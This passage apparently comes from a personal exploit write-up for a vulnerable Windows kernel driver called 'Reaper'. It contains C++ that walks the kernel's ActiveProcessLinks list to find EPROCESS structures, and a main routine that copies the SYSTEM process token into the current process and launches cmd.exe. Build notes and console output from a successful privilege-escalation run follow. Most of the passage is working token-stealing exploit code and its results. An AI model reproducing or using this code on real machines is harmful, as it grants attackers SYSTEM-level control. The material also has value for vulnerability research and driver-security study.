        printf("Could not find current process in ActiveProcessLinks\n");
        exit(-1);
    }
    eProcResult result{};
    result.eProcess = cProcess;
    result.tokenPtr = cTokenPtr;
    result.pid = cPid;
    return result;
}
```

The while loop loops over `ActiveProcessLinks` field, like a cursor.  The initial starting point is the system process.  The enclosed IF statement checks the `pid` passed in at invocation against the cursored `cPid`.

The only caveat here is that it requires `getSystemEProcess()`, which itself requires a few structs and enums, other definitions, all of which I had to go hunting for throughout the repo. 

Definitions:
 * SystemHandleInformation
 * SystemHandleInformationSize
Type definitions:
 * eProcResult
 * fNtQuerySystemInformation
 * _SYSTEM_HANDLE_TABLE_ENTRY_INFO
 * _SYSTEM_HANDLE_INFORMATION

And then finally, a `main` function that does the walking and writing.

```c++
int main(void)
{
    reap = ReaperSysHandle();
    printf("I am reapthereaper\n");
    eProcResult systemProcess = GetCurrentEProcessByPid(4);
    eProcResult currentProcess = GetCurrentEProcessByPid(GetCurrentProcessId());

    Action(OP_REMOTE, systemProcess.eProcess + EPROCESS_Token, currentProcess.eProcess + EPROCESS_Token);
    system("cmd.exe");

    if (reap) return CloseHandle(reap);
}
```

Other notable mentions:
1. statically-compiled release x64: Project > (binary) properties > Configuration Properties > C/C++ > Code Generation >  Runtime Library == "Multithreaded (/MT)"
2. Auto-copy to Virtualbox shared drive:  Project > (binary) properties > Configuration Properties > Custom Build Step > Command Line  == `copy C:\Users\Admin\Desktop\EXCLUSION_ZONE_WHITELISTED\reapthereaper\x64\Release\reapthereaper.exe z:\`

### Getting the shell

![[Pasted_image_20251109021310.png]]

Upon exit:

```sh
C:\users\keysvc>exit
exit
[handle] Good handle for device \\.\Reaper: 0x0
I am reapthereaper
[>] System _EPROCESS: 0xffff9101cae8d040
[>] Process: ffff9101cae8d040 (PID: 4, TOKEN_PTR: ffff800aa2a0f045)
[>] System _EPROCESS: 0xffff9101cae8d040
[>] Process: ffff9101d1220080 (PID: 2492, TOKEN_PTR: ffff800aac4f2735)
```


![[Pasted_image_20251109021631.png]]

Scythes out for Reaper